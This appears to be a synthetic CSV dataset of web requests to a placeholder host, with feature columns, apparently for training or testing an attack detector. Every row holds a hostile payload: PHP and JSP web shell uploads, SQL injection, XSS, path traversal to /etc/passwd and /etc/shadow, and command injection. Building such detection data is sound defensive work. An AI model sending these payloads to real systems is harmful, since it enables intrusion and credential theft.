timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T15:37:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.4,22,1,85,1,200,1078
2025-01-01T15:38:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.85,13,1,22,0,403,1298
2025-01-01T15:39:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.21,19,1,55,1,403,416
2025-01-01T15:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.84,19,1,55,1,302,433
2025-01-01T15:41:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.8,3,1,18,0,500,229
2025-01-01T15:42:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.95,19,1,55,1,500,1581
2025-01-01T15:43:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.41,7,1,25,0,302,983
2025-01-01T15:44:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.71,3,1,18,0,200,362
2025-01-01T15:45:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.05,3,1,8,0,403,353
2025-01-01T15:46:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.48,19,1,55,1,302,721
2025-01-01T15:47:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.95,7,1,33,0,200,264
2025-01-01T15:48:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.15,19,1,55,1,500,315
2025-01-01T15:49:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.38,6,1,22,0,403,710
2025-01-01T15:50:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.73,3,1,15,0,500,1323
2025-01-01T15:51:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.6,7,1,33,0,500,1517
2025-01-01T15:52:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.21,7,1,25,0,403,1323
2025-01-01T15:53:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.41,7,1,33,0,200,470
2025-01-01T15:54:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.26,7,1,11,0,403,595
2025-01-01T15:55:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.87,19,1,55,1,403,462
2025-01-01T15:56:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.43,6,1,21,0,302,543
2025-01-01T15:57:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.68,13,1,22,0,500,723
2025-01-01T15:58:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.63,10,1,27,0,403,266
2025-01-01T15:59:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.09,1,1,3,0,200,466
2025-01-01T16:00:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.88,7,1,25,0,200,749
2025-01-01T16:01:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,3.6,7,1,19,0,200,1293
2025-01-01T16:02:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.19,0,1,2,0,403,1077
2025-01-01T16:03:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.73,7,1,19,0,200,909
2025-01-01T16:04:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.09,7,1,25,0,200,295
2025-01-01T16:05:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.99,6,1,21,0,500,1301
2025-01-01T16:06:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.53,22,1,85,1,403,1387
2025-01-01T16:07:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.91,0,1,2,0,500,436
2025-01-01T16:08:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.13,6,1,21,0,403,822
2025-01-01T16:09:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.98,6,1,21,0,403,495
2025-01-01T16:10:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.62,6,1,21,0,200,894
2025-01-01T16:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.22,19,1,55,1,200,1018
2025-01-01T16:12:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.11,7,1,25,0,302,849
2025-01-01T16:13:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.84,3,1,8,0,500,951
2025-01-01T16:14:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.07,7,1,25,0,200,1222
2025-01-01T16:15:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.54,6,1,21,0,403,650
2025-01-01T16:16:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.13,22,1,85,1,500,977
2025-01-01T16:17:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.61,7,1,19,0,500,488
2025-01-01T16:18:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.56,8,1,28,0,302,839
2025-01-01T16:19:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.38,7,1,19,0,200,1231
2025-01-01T16:20:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.13,22,1,85,1,302,474
2025-01-01T16:21:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.85,22,1,85,1,200,1186
2025-01-01T16:22:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.0,19,1,55,1,403,1519
2025-01-01T16:23:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.77,3,1,15,0,500,503
2025-01-01T16:24:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.84,19,1,55,1,500,855
2025-01-01T16:25:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.91,1,1,3,0,200,939
2025-01-01T16:26:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.28,0,1,2,0,500,1348
2025-01-01T16:27:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.2,7,1,11,0,500,206
2025-01-01T16:28:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.01,6,1,22,0,500,957
2025-01-01T16:29:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.31,7,1,33,0,200,1276
2025-01-01T16:30:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.31,19,1,55,1,302,678
2025-01-01T16:31:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.48,10,1,27,0,200,577
2025-01-01T16:32:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.92,10,1,27,0,200,1007
2025-01-01T16:33:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.98,3,1,8,0,403,641
2025-01-01T16:34:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.65,7,1,33,0,403,395
2025-01-01T16:35:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.77,6,1,21,0,200,683
2025-01-01T16:36:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.36,3,1,18,0,403,1098
2025-01-01T16:37:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.06,2,1,11,0,500,707
2025-01-01T16:38:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.87,13,1,22,0,403,591
2025-01-01T16:39:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.83,1,1,3,0,500,1122
2025-01-01T16:40:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.7,6,1,21,0,200,294
2025-01-01T16:41:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.75,22,1,85,1,500,755
2025-01-01T16:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.13,22,1,85,1,403,1055
2025-01-01T16:43:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.27,7,1,19,0,302,639
2025-01-01T16:44:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.86,13,1,22,0,403,242
2025-01-01T16:45:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.45,13,1,22,0,302,523
2025-01-01T16:46:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.97,22,1,85,1,200,1484
2025-01-01T16:47:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.94,19,1,55,1,200,243
2025-01-01T16:48:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.31,19,1,55,1,403,202
2025-01-01T16:49:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.62,8,1,28,0,500,881
2025-01-01T16:50:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.47,1,1,3,0,403,770
2025-01-01T16:51:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.74,0,1,2,0,500,1167
2025-01-01T16:52:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.75,7,1,33,0,403,352
2025-01-01T16:53:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.07,13,1,22,0,403,304
2025-01-01T16:54:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.97,3,1,8,0,500,1221
2025-01-01T16:55:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.19,7,1,25,0,500,508
2025-01-01T16:56:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.96,3,1,8,0,403,1155
2025-01-01T16:57:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.39,8,1,28,0,500,997
2025-01-01T16:58:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.0,7,1,11,0,403,204
2025-01-01T16:59:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.56,3,1,15,0,200,1222
2025-01-01T17:00:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.6,6,1,22,0,500,541
2025-01-01T17:01:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.79,7,1,11,0,302,1308
2025-01-01T17:02:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.82,3,1,8,0,403,1035
2025-01-01T17:03:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.21,19,1,55,1,500,1105
2025-01-01T17:04:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.19,19,1,55,1,302,588
2025-01-01T17:05:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.61,3,1,15,0,403,399
2025-01-01T17:06:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.45,7,1,25,0,200,1219
2025-01-01T17:07:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.54,2,1,11,0,200,232
2025-01-01T17:08:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.02,8,1,28,0,302,613
2025-01-01T17:09:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.08,0,1,2,0,200,1173
2025-01-01T17:10:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.63,6,1,22,0,200,212
2025-01-01T17:11:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.62,13,1,22,0,500,1175
2025-01-01T17:12:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.11,7,1,33,0,200,1516
2025-01-01T17:13:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.25,2,1,11,0,403,215
2025-01-01T17:14:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.45,10,1,27,0,500,750
2025-01-01T17:15:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.96,10,1,27,0,403,767
2025-01-01T17:16:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.91,22,1,85,1,403,399
2025-01-01T17:17:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.61,7,1,19,0,200,565
2025-01-01T17:18:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.2,7,1,33,0,500,820
2025-01-01T17:19:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.82,1,1,3,0,302,509
2025-01-01T17:20:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.75,1,1,3,0,403,620
2025-01-01T17:21:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.18,22,1,85,1,200,1466
2025-01-01T17:22:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.46,3,1,8,0,200,996
2025-01-01T17:23:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.93,0,1,6,0,500,1162
2025-01-01T17:24:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.07,8,1,28,0,403,822
2025-01-01T17:25:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.93,8,1,28,0,500,692
2025-01-01T17:26:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.07,0,1,6,0,302,993
2025-01-01T17:27:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.45,13,1,22,0,403,574
2025-01-01T17:28:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.72,6,1,21,0,302,980
2025-01-01T17:29:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.19,3,1,18,0,500,878
2025-01-01T17:30:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.34,6,1,21,0,200,832
2025-01-01T17:31:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.32,22,1,85,1,200,474
2025-01-01T17:32:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.96,3,1,18,0,500,1080
2025-01-01T17:33:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.49,8,1,28,0,200,913
2025-01-01T17:34:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.23,13,1,22,0,403,552
2025-01-01T17:35:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.82,1,1,3,0,200,1133
2025-01-01T17:36:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.83,8,1,28,0,500,732
2025-01-01T17:37:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.61,2,1,11,0,302,993
2025-01-01T17:38:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.82,7,1,11,0,500,383
2025-01-01T17:39:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.3,3,1,8,0,403,926
2025-01-01T17:40:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.97,3,1,8,0,302,1125
2025-01-01T17:41:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.69,22,1,85,1,500,701
2025-01-01T17:42:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.9,7,1,11,0,200,1477
2025-01-01T17:43:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.03,6,1,21,0,403,598
2025-01-01T17:44:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.58,0,1,6,0,200,1024
2025-01-01T17:45:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.91,19,1,55,1,302,569
2025-01-01T17:46:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.58,3,1,8,0,403,353
2025-01-01T17:47:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.56,7,1,33,0,500,225
2025-01-01T17:48:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.0,7,1,19,0,403,893
2025-01-01T17:49:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.54,7,1,11,0,302,1271
2025-01-01T17:50:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.32,6,1,21,0,200,353
2025-01-01T17:51:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.05,7,1,11,0,200,1594
2025-01-01T17:52:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.71,3,1,18,0,500,740
2025-01-01T17:53:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.77,7,1,33,0,200,1041
2025-01-01T17:54:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.7,7,1,19,0,500,1254
2025-01-01T17:55:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.15,10,1,27,0,500,1012
2025-01-01T17:56:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.26,7,1,33,0,403,855
2025-01-01T17:57:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.77,6,1,21,0,200,554
2025-01-01T17:58:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.13,19,1,55,1,302,1477
2025-01-01T17:59:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.02,7,1,33,0,500,1430
2025-01-01T18:00:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.38,22,1,85,1,200,579
2025-01-01T18:01:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.93,0,1,2,0,500,1078
2025-01-01T18:02:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.66,19,1,55,1,302,626
2025-01-01T18:03:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.56,10,1,27,0,500,634
2025-01-01T18:04:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.15,7,1,33,0,403,1404
2025-01-01T18:05:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.26,19,1,55,1,302,856
2025-01-01T18:06:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.87,3,1,8,0,200,672
2025-01-01T18:07:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.43,19,1,55,1,403,1274
2025-01-01T18:08:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.41,2,1,11,0,500,770
2025-01-01T18:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.24,19,1,55,1,500,788
2025-01-01T18:10:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.63,3,1,15,0,403,1270
2025-01-01T18:11:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.36,3,1,15,0,403,808
2025-01-01T18:12:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.57,22,1,85,1,500,1200
2025-01-01T18:13:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.23,22,1,85,1,200,1378
2025-01-01T18:14:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.84,1,1,3,0,200,323
2025-01-01T18:15:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.4,2,1,11,0,200,1521
2025-01-01T18:16:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.39,2,1,11,0,500,1372
2025-01-01T18:17:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.08,13,1,22,0,302,1180
2025-01-01T18:18:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.91,7,1,11,0,302,1594
2025-01-01T18:19:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.84,10,1,27,0,200,1216
